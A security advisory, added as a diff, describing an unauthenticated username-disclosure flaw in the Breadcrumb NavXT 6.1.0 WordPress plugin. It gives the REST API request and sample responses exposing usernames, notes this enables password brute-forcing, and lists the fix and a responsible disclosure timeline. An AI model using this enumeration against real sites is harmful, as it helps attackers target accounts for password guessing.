@@ -1,0 +1,107 @@
+id: 31200
+date: 09/27/2018
+title: WordPress Breadcrumb NavXT 6.1.0 Username Disclosure
+author: waraxe
+cves: 
+
+Username Disclosure in Breadcrumb NavXT Wordpress plugin
+============================================================
+
+Author: Janek Vind "waraxe"
+Date: 26. September 2018
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-108.html
+
+Target description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Breadcrumb NavXT, the successor to the popular WordPress plugin Breadcrumb
+Navigation XT, was written from the ground up to be better than its ancestor.
+This plugin generates locational breadcrumb trails for your WordPress powered
+blog or website. These breadcrumb trails are highly customizable to suit the
+needs of just about any website running WordPress.
+
+https://wordpress.org/plugins/breadcrumb-navxt/
+
+Vulnerable version: 6.1.0
+Fixed version: 6.2.0
+Active installations: 700 000+
+
+###############################################################################
+1. Wordpress Username Disclosure via REST API function "author"
+###############################################################################
+ 
+Breadcrumb NavXT plugin provides REST API functionality:
+
+http://localhost/wp498/wp-json/bcn/v1
+
+Let's look at REST API function "author":
+
+/bcn/v1/author/(?P<id>\d+)":{
+            "namespace":"bcn/v1",
+            "methods":[
+                "GET",
+                "OPTIONS"
+            ],
+            "endpoints":[
+                {
+                    "methods":[
+                        "GET",
+                        "OPTIONS"
+                    ],
+                    "args":{
+                        "id":{
+                            "required":true,
+                            "description":"The ID of the author to retrieve the breadcrumb trail for.",
+                            "type":"integer"
+                        }
+                    }
+                }
+            ]
+        }
+    
+http://localhost/wp498/wp-json/bcn/v1/author/1
+
+{"@context":"http:\/\/schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http:\/\/localhost\/wp498","name":"Test site"}},{"@type":"ListItem","position":2,"item":{"@id":"","name":"root"}}]}
+
+http://localhost/wp498/wp-json/bcn/v1/author/4
+
+{"@context":"http:\/\/schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http:\/\/localhost\/wp498","name":"Test site"}},{"@type":"ListItem","position":2,"item":{"@id":"","name":"editor"}}]}
+
+As seen above, Wordpress usernames "root" and "editor" are exposed in API responses.
+Closer look at the source code of Breadcrumb NavXT plugin reveals that information exposed
+is actually Wordpress user's "display_name", which can be either username or nickname.
+By default "display_name" equals to username, but user can change this behavior in "Profile"
+menu option "Display name publicly as". 
+
+API function "author" can be accessed in unauthenticated state and as result anyone can
+list Wordpress usernames without registering or having an account on website. 
+Wordpress authentication is based on two pieces of information - username and password.
+It's possible to launch password bruteforce attack when username is known.
+
+How to fix: upgrade Breadcrumb NavXT Wordpress plugin to version 6.2.0.
+In this new version API endpoints are disabled by default.
+It's also possible to completely disable Breadcrumb NavXT REST API by setting
+BCN_DISABLE_REST_API to true in a site's configuration file "wp-config.php",
+as described in https://mtekk.us/archives/guides/disabling-breadcrumb-navxts-rest-api/
+
+
+Disclosure timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 
+13.09.2018 -> First email sent to developers
+13.09.2018 -> Got first response from developers
+13.09.2018 -> Sending detailed information to developers
+25.09.2018 -> Found problems are fixed, new version available
+26.09.2018 -> Waraxe advisory released
+ 
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+ 
+Waraxe forum:  http://www.waraxe.us/
+Personal homepage: http://www.janekvind.com/
+
+#  0day.today [2023-03-22]  #
